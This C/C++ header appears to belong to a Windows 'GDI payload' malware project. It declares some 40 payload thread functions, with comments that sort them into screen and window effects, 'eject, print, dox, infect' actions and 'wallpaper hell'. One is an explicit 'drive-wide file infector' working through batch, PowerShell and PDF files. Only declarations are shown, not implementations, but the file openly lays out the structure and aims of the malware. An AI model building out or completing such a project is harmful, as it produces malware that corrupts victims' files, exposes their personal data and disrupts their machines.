#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <windows.h>

// ============================================================
// LIGHT PAYLOADS
//
// Window/cursor/process/system effects plus low-cost screen
// modifiers. NOT gated by the heavy slot: they overlap freely
// with each other and with the heavy renderers.
//
//  3, 4, 12, 16, 18  original + fast visual effects.
//  25-49             mixed visual + window/cursor manipulation.
//  64                easter egg (XM + party MessageBox).
//  65-68             system flavor (eject, print, dox, infect).
//  69-72             FX pack 3 (per-pixel shaders).
//  73, 74            mouse swap + wallpaper hell.
// ============================================================

DWORD WINAPI GDIPayload3(LPVOID);
DWORD WINAPI GDIPayload4(LPVOID);
DWORD WINAPI GDIPayload12(LPVOID);
DWORD WINAPI GDIPayload16(LPVOID);
DWORD WINAPI GDIPayload18(LPVOID);
DWORD WINAPI GDIPayload25(LPVOID);
DWORD WINAPI GDIPayload26(LPVOID);
DWORD WINAPI GDIPayload28(LPVOID);
DWORD WINAPI GDIPayload29(LPVOID);
DWORD WINAPI GDIPayload30(LPVOID);
DWORD WINAPI GDIPayload31(LPVOID);
DWORD WINAPI GDIPayload32(LPVOID);
DWORD WINAPI GDIPayload33(LPVOID);
DWORD WINAPI GDIPayload34(LPVOID);
DWORD WINAPI GDIPayload35(LPVOID);
DWORD WINAPI GDIPayload36(LPVOID);
DWORD WINAPI GDIPayload37(LPVOID);
DWORD WINAPI GDIPayload38(LPVOID);
DWORD WINAPI GDIPayload39(LPVOID);
DWORD WINAPI GDIPayload41(LPVOID);
DWORD WINAPI GDIPayload42(LPVOID);
DWORD WINAPI GDIPayload43(LPVOID);
DWORD WINAPI GDIPayload44(LPVOID);
DWORD WINAPI GDIPayload45(LPVOID);
DWORD WINAPI GDIPayload46(LPVOID);
DWORD WINAPI GDIPayload47(LPVOID);
DWORD WINAPI GDIPayload49(LPVOID);
DWORD WINAPI GDIPayload64(LPVOID);
DWORD WINAPI GDIPayload65(LPVOID);
DWORD WINAPI GDIPayload66(LPVOID);
DWORD WINAPI GDIPayload67(LPVOID);

// Full drive-wide file infector (batch + powershell + pdf).
DWORD WINAPI FileInfect(LPVOID);

// FX pack 3.
DWORD WINAPI GDIPayload69(LPVOID);
DWORD WINAPI GDIPayload70(LPVOID);
DWORD WINAPI GDIPayload71(LPVOID);
DWORD WINAPI GDIPayload72(LPVOID);

// System flavor.
DWORD WINAPI GDIPayload73(LPVOID);
DWORD WINAPI GDIPayload74(LPVOID);